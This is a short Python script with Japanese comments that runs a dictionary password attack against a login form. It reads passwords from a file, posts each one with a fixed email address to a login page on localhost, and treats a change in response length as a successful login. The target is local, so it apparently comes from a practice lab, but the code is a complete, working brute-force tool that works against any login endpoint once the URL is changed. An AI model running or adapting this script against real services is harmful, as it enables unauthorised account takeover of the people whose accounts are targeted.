import requests

#① パスワードリストをリストに代入する
password_list = []
with open("password-list.txt") as f:
    line = f.read()
    password_list = line.splitlines()
loop_len = len(password_list)

#② POSTパラメータをJSON形式で保持する
for i in range(loop_len):
    data = {
        'email': 'sendy@sendy.com',
        'passw': password_list[i],
    }
    response = requests.post('http://localhost:8080/login', data=data)
    #③  最初は、１つ前の情報がないので対応させる
    if i == 0: 
        pre_response_len = len(response.text)
    response_len = len(response.text)
    print(f'{response_len}:{password_list[i]}')
    
    #④  1つ前のリクエストボディの長さが異なれば、ログイン成功とする
    if response_len != pre_response_len:
        break
    else:
        pre_response_len = response_len
        
